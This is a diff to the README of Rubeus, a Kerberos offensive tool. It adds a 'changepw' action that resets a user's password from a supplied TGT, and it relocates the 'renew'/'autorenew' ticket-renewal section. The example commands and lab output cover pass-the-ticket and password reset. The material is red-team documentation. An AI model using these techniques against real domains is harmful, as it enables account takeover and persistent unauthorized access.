@@ -26,6 +26,9 @@ Rubeus is licensed under the BSD 3-Clause license.
     Renew a TGT, optionally appling the ticket or auto-renewing the ticket up to its renew-till limit:
         Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/ptt] [/autorenew]
 
+    Reset a user's password from a supplied TGT (AoratoPw):
+        Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER]
+
     Retrieve a service ticket for one or more SPNs, optionally applying the ticket:
         Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/dc:DOMAIN_CONTROLLER] [/ptt]
 
@@ -147,77 +150,6 @@ Note that no elevated privileges are needed on the host to request TGTs or apply
 **Note that the /luid and /createnetonly parameters require elevation!**
 
 
-## renew
-
-The **renew** action will build/parse a raw TGS-REQ/TGS-REP TGT renewal exchange using the specified /ticket:X supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a /dc is not specified, the computer's current domain controller is extracted and used as the destination for the renewal traffic. The /ptt flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session.
-
-Note that TGTs MUST be renewed before their EndTime, within the RenewTill window.
-
-    c:\Rubeus>Rubeus.exe renew /ticket:doIFmjCC...(snip)...
-
-     ______        _
-    (_____ \      | |
-     _____) )_   _| |__  _____ _   _  ___
-    |  __  /| | | |  _ \| ___ | | | |/___)
-    | |  \ \| |_| | |_) ) ____| |_| |___ |
-    |_|   |_|____/|____/|_____)____/(___/
-
-    v1.0.0
-
-    [*] Action: Renew TGT
-
-    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
-    [*] Building TGS-REQ renewal for: 'TESTLAB.LOCAL\dfm.a'
-    [*] Connecting to 192.168.52.100:88
-    [*] Sent 1500 bytes
-    [*] Received 1510 bytes
-    [+] TGT renewal request successful!
-    [*] base64(ticket.kirbi):
-
-        doIFmjCCBZagAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoQ8bDVRFU1RMQUIuTE9DQUyiIjAg
-        ...(snip)...
-
-The **/autorenew** flag will take an existing /ticket .kirbi file, sleep until endTime-30 minutes, auto-renew the ticket and display the refreshed ticket blob. It will continue this renewal process until the allowable renew-till renewal window passes.
-
-C:\Rubeus>Rubeus.exe renew /ticket:doIFFj...(snip)... /autorenew
-
-       ______        _
-      (_____ \      | |
-       _____) )_   _| |__  _____ _   _  ___
-      |  __  /| | | |  _ \| ___ | | | |/___)
-      | |  \ \| |_| | |_) ) ____| |_| |___ |
-      |_|   |_|____/|____/|_____)____/(___/
-
-      v1.0.0
-
-    [*] Action: Auto-Renew TGT
-
-
-    [*] User       : harmj0y@TESTLAB.LOCAL
-    [*] endtime    : 9/24/2018 3:34:05 AM
-    [*] renew-till : 9/30/2018 10:34:05 PM
-    [*] Sleeping for 165 minutes (endTime-30) before the next renewal
-    [*] Renewing TGT for harmj0y@TESTLAB.LOCAL
-
-    [*] Action: Renew TGT
-
-    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
-    [*] Building TGS-REQ renewal for: 'TESTLAB.LOCAL\harmj0y'
-    [*] Connecting to 192.168.52.100:88
-    [*] Sent 1370 bytes
-    [*] Received 1378 bytes
-    [+] TGT renewal request successful!
-    [*] base64(ticket.kirbi):
-
-          doIFFjCCBRKg...(snip)...
-
-
-    [*] User       : harmj0y@TESTLAB.LOCAL
-    [*] endtime    : 9/24/2018 8:03:55 AM
-    [*] renew-till : 9/30/2018 10:34:05 PM
-    [*] Sleeping for 269 minutes (endTime-30) before the next renewal
-
-
 ## asktgs
 
 The **asktgs** action will build/parse a raw TGS-REQ/TGS-REP service ticket request using the specified TGT /ticket:X supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a /dc is not specified, the computer's current domain controller is extracted and used as the destination for the request traffic. The /ptt flag will "pass-the-ticket" and apply the resulting service ticket to the current logon session. One or more /service:X SPNs must be specified, comma separated.
@@ -315,6 +247,107 @@ The **asktgs** action will build/parse a raw TGS-REQ/TGS-REP service ticket requ
             Session Key Type: AES-128-CTS-HMAC-SHA1-96
             Cache Flags: 0
             Kdc Called:
+
+
+## renew
+
+The **renew** action will build/parse a raw TGS-REQ/TGS-REP TGT renewal exchange using the specified /ticket:X supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a /dc is not specified, the computer's current domain controller is extracted and used as the destination for the renewal traffic. The /ptt flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session.
+
+Note that TGTs MUST be renewed before their EndTime, within the RenewTill window.
+
+    c:\Rubeus>Rubeus.exe renew /ticket:doIFmjCC...(snip)...
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.0.0
+
+    [*] Action: Renew TGT
+
+    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Building TGS-REQ renewal for: 'TESTLAB.LOCAL\dfm.a'
+    [*] Connecting to 192.168.52.100:88
+    [*] Sent 1500 bytes
+    [*] Received 1510 bytes
+    [+] TGT renewal request successful!
+    [*] base64(ticket.kirbi):
+
+        doIFmjCCBZagAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoQ8bDVRFU1RMQUIuTE9DQUyiIjAg
+        ...(snip)...
+
+The **/autorenew** flag will take an existing /ticket .kirbi file, sleep until endTime-30 minutes, auto-renew the ticket and display the refreshed ticket blob. It will continue this renewal process until the allowable renew-till renewal window passes.
+
+    C:\Rubeus>Rubeus.exe renew /ticket:doIFFj...(snip)... /autorenew
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v1.0.0
+
+    [*] Action: Auto-Renew TGT
+
+
+    [*] User       : harmj0y@TESTLAB.LOCAL
+    [*] endtime    : 9/24/2018 3:34:05 AM
+    [*] renew-till : 9/30/2018 10:34:05 PM
+    [*] Sleeping for 165 minutes (endTime-30) before the next renewal
+    [*] Renewing TGT for harmj0y@TESTLAB.LOCAL
+
+    [*] Action: Renew TGT
+
+    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Building TGS-REQ renewal for: 'TESTLAB.LOCAL\harmj0y'
+    [*] Connecting to 192.168.52.100:88
+    [*] Sent 1370 bytes
+    [*] Received 1378 bytes
+    [+] TGT renewal request successful!
+    [*] base64(ticket.kirbi):
+
+          doIFFjCCBRKg...(snip)...
+
+
+    [*] User       : harmj0y@TESTLAB.LOCAL
+    [*] endtime    : 9/24/2018 8:03:55 AM
+    [*] renew-till : 9/30/2018 10:34:05 PM
+    [*] Sleeping for 269 minutes (endTime-30) before the next renewal
+
+
+## changepw
+
+The **changepw** action will take a user's TGT .kirbi blog and execute a MS kpasswd password change with the specified /new:X value. If a /dc is not specified, the computer's current domain controller is extracted and used as the destination for the password reset traffic. This is the Aorato Kerberos password reset disclosed in 2014, and is equivalent to Kekeo's misc::changepw function.
+
+    C:\Temp\tickets>Rubeus.exe changepw /ticket:doIFFjCCBRKgA...(snip)...== /new:Password123!
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v1.2.0
+
+    [*] Action: Reset User Password (AoratoPw)
+
+    [*] Changing password for user: harmj0y@TESTLAB.LOCAL
+    [*] New password value: Password123!
+    [*] Building AP-REQ for the MS Kpassword request
+    [*] Building Authenticator with encryption key type: rc4_hmac
+    [*] base64(session subkey): nX2FOQ3RsGxoI8uqIg1zlg==
+    [*] Building the KRV-PRIV structure
+    [*] Connecting to 192.168.52.100:464
+    [*] Sent 1347 bytes
+    [*] Received 167 bytes
+    [+] Password change success!
+
 
 ## s4u
 
